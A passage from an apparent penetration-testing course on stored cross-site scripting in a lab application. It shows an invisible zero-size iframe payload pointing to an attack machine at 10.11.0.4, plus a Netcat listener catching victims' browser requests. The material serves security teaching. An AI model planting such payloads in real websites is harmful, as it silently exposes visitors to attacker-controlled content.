After submitting our payload, refreshing the Feedback page should execute our injected JavaScript:

![](bbox=[0.14, 0.14, 0.86, 0.43])

Excellent. We have injected a cross-site scripting payload into the web application’s database and it will be served to anyone that views the site. A simple alert window is a somewhat trivial example of what can be done with cross-site scripting so let’s try something more interesting.

# 9.4.2.3  Content Injection

XSS vulnerabilities are often used to deliver client-side attacks as they allow for the redirection of a victim’s browser to a location of the attacker’s choosing. A stealthy alternative to a redirect is to inject an invisible iframe$^{268}$ like the following into our XSS payload.

```
<iframe src=http://10.11.0.4/report height="0" width="0"></iframe>
Listing 288 - Using an iframe to deliver an XSS payload
```

An iframe is used to embed another file, such as an image or another HTML file, within the current HTML document. In our case, “report” is a file hyperlinked on our attack machine, and the iframe is invisible because it has no size since the height and width are set to zero.

Once this payload has been submitted, any user that visits the page will connect back to our attack machine. To test this, we can create a Netcat listener on our attack machine (10.11.0.4 in this example) on port 80, and refresh the Feedback page.

```
kali@kali:~$ sudo nc -nvlp 80
[sudo] password for kali:
listening on [any] 80 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 41612
GET /report HTTP/1.1
Host: 10.11.0.4
```

268  (Mozilla, 2019). https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe